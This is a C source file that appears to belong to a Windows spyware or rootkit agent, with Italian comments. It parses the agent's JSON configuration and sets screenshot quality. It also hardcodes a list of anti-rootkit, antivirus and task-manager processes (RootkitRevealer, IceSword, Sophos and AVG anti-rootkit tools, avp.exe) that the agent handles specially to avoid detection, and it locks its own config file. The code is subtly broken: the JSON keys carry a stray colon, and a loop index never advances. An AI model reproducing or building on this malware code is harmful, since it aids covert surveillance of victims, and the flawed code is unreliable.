#include <windows.h>
#include <stdio.h>
#include <cJSON/cJSON.h>
#include "common.h"
#include "bss.h"
#include "H4-DLL.h"
#include "LOG.h"
#include "config.h"

static const char* bypass_json_list = R"(
[
	{ "processName:": "outlook.exe", "description": "*Outlook*"},
	{ "processName:": "ielowutil.exe" },
	{ "processName:": "TaskMan.exe", "description": "Security Task Manager" },
	{ "processName:": "hackmon.exe", "description": "Detects*rootkits*"},
	{ "processName:": "hiddenfinder.exe", "description": "*Hidden*Process*Finder*" },
	{ "processName:": "Unhackme.exe", "description": "Detects*rootkits*" },
	{ "processName:": "fsbl.exe", "description" : "*Secure*BlackLight*"},
	{ "processName:": "sargui.exe", "description" : "Sophos Anti*Rootkit*" },
	{ "processName:": "avgarkt.exe", "description" : "AVG Anti*Rootkit*" },
	{ "processName:": "avscan.exe" },
	{ "processName:": "RootkitRevealer.exe", "description": "Rootkit detection utility*"},
	{ "processName:": "taskmgr.exe" },
	{ "processName:": "avgscanx.exe" },
	{ "processName:": "IceSword.exe" },
	{ "processName:": "rku*.exe" },
	{ "processName:": "pavark.exe", "description": "*pavark*" },
	{ "processName:": "avp.exe" },
	{ "processName:": "bgscan.exe" },
	{ "processName:": "FlashPlayerPlugin_*.exe" },
	{ "processName:": "avk.exe" },
	{ "processName:": "k7*.exe" },
	{ "processName:": "rootkitbuster*.exe", "description":"Trend Micro RootkitBuster*"},
	{ "processName:": "pcts*.exe" },
	{ "processName:": "iexplore.exe", "description":"*Internet Explorer*" },
	{ "processName:": "chrome.exe", "description":"*Google*Chrome*"},
	{ "processName:": "fsm32.exe", "description": "*F-Secure Settings*"}
]
)";

// Usata per lockare il file di conf
static HANDLE conf_file_handle = NULL;

// Passa alla callback tutti i sotto-oggetti dell'oggetto "section" nella configurazione json
typedef void (WINAPI* conf_callback_t)(cJSON *, DWORD counter);
BOOL HM_ParseConfSection(char* conf, const char* section, conf_callback_t call_back)
{
	DWORD counter = 0;
	
	cJSON* root = cJSON_Parse(conf);

	if (cJSON_IsObject(root) == false) {
		if (root != NULL)
			cJSON_Delete(root);
		return FALSE;
	}

	cJSON* arr = cJSON_GetObjectItem(root, section);

	if (cJSON_IsArray(arr)) {
		cJSON* n = NULL;
		cJSON_ArrayForEach(n, arr)
			call_back(n, counter++);
	}

	cJSON_Delete(root);
	return TRUE;
}

// Passa l'oggetto json delle globals
BOOL HM_ParseConfGlobals(char* conf, conf_callback_t call_back)
{
	cJSON* root = cJSON_Parse(conf);

	if (cJSON_IsObject(root)) {
		cJSON* globals = cJSON_GetObjectItem(root, "globals");
		if (globals != NULL)
			call_back(globals, 0);
	}

	cJSON_Delete(root);
	return TRUE;
}

BOOL HM_CountConfSection(char* conf, const char* sectionName, DWORD* count)
{
	*count = 0;
	cJSON* root = cJSON_Parse(conf);
	
	if (cJSON_IsObject(root)) {
		cJSON* section = cJSON_GetObjectItem(root, sectionName);
		*count = cJSON_GetArraySize(section);
	}
	
	cJSON_Delete(root);
	if (*count != 0)
		return TRUE;
	return FALSE;
}


void WINAPI ParseBypassCallback(cJSON* conf_json, DWORD dummy)
{
	DWORD index;
	cJSON* bypass_array = cJSON_GetObjectItem(conf_json, "nohide");

	shared.process_bypassed = cJSON_GetArraySize(bypass_array);
	if (shared.process_bypassed > MAX_DYNAMIC_BYPASS)
		shared.process_bypassed = MAX_DYNAMIC_BYPASS;
	shared.process_bypassed += EMBEDDED_BYPASS; // Inserisce i processi hardcoded

	// Legge i processi rimanenti dal file di configurazione
	cJSON* node = NULL;
	index = 0;
	cJSON_ArrayForEach(node, bypass_array) {
		const char* value = cJSON_GetStringValue(node);
		_snprintf_s(shared.process_bypass_list[index + EMBEDDED_BYPASS], MAX_PBYPASS_LEN, _TRUNCATE, "%s", value);
		index++;
	}
}

void WINAPI ParseDriverHandling(cJSON* conf_json, DWORD dummy)
{
	cJSON* remove_driver = cJSON_GetObjectItem(conf_json, "remove_driver");
	shared.g_remove_driver = (BOOL)cJSON_IsTrue(remove_driver);
}


static void setup_bypass_list()
{
	cJSON* value = cJSON_Parse(bypass_json_list);

	if (value != NULL && cJSON_IsArray(value)) {
		cJSON* ptr = NULL;
		int i = 0;

		cJSON_ArrayForEach(ptr, value) {
			cJSON* processName = cJSON_GetObjectItem(ptr, "processName");
			cJSON* description = cJSON_GetObjectItem(ptr, "description");

			sprintf_s(shared.process_bypass_list[i], "%s", cJSON_GetStringValue(processName));
			if (description != NULL) {};
				//wcscpy(shared.process_bypass_desc[i], obj[L"description"]->AsString().c_str());
		}
	}

	cJSON_Delete(value);
}
// Legge le configurazioni globali
void HM_UpdateGlobalConf()
{
	char* conf_memory;

	// Se non riesce a leggere la configurazione, inizializza comunque
	// i valori globali.
	memset(&date_delta, 0, sizeof(date_delta));
	// Lista di processi da non toccare
	shared.process_bypassed = EMBEDDED_BYPASS;
	ZeroMemory(shared.process_bypass_list, sizeof(shared.process_bypass_list));
	ZeroMemory(shared.process_bypass_desc, sizeof(shared.process_bypass_desc));
	
	setup_bypass_list();	// get from json array attributes

	// Legge il delta date dal file di stato...
	Log_RestoreAgentState(PM_CORE, (BYTE*)&date_delta, sizeof(date_delta));

	// Legge la lista dei processi da bypassare e la gestione del driver
	conf_memory = HM_ReadClearConf(shared.H4_CONF_FILE);
	if (conf_memory) {
		HM_ParseConfGlobals(conf_memory, &ParseBypassCallback);
		HM_ParseConfGlobals(conf_memory, &ParseDriverHandling);
	}
	SAFE_FREE(conf_memory);
}

void LockConfFile()
{
	char conf_path[DLLNAMELEN];
	HM_CompletePath(shared.H4_CONF_FILE, conf_path);
	FNC(SetFileAttributesA)(conf_path, FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_ARCHIVE);
	conf_file_handle = FNC(CreateFileA)(conf_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
}

void UnlockConfFile()
{
	char conf_path[DLLNAMELEN];

	HM_CompletePath(shared.H4_CONF_FILE, conf_path);

	if (conf_file_handle)
		CloseHandle(conf_file_handle);
	conf_file_handle = NULL;

	for (DWORD i = 0; i < MAX_DELETE_TRY; i++) {
		if (FNC(SetFileAttributesA)(conf_path, FILE_ATTRIBUTE_NORMAL))
			break;
		Sleep(DELETE_SLEEP_TIME);
	}
}

/** config_get_quality(elem):DWORD */
DWORD config_get_quality(cJSON* elem)
{
	cJSON* quality = cJSON_GetObjectItem(elem, "quality");

	if (quality != NULL)
	{
		const char* value = cJSON_GetStringValue(quality);

		if (!strcmp(value, "lo"))
			return IMAGE_QUALITY_LOW;
		if (!strcmp(value, "med"))
			return IMAGE_QUALITY_MEDIUM;
		if (!strcmp(value, "high"))
			return IMAGE_QUALITY_HIGH;
	}

	return IMAGE_QUALITY_LOW;
}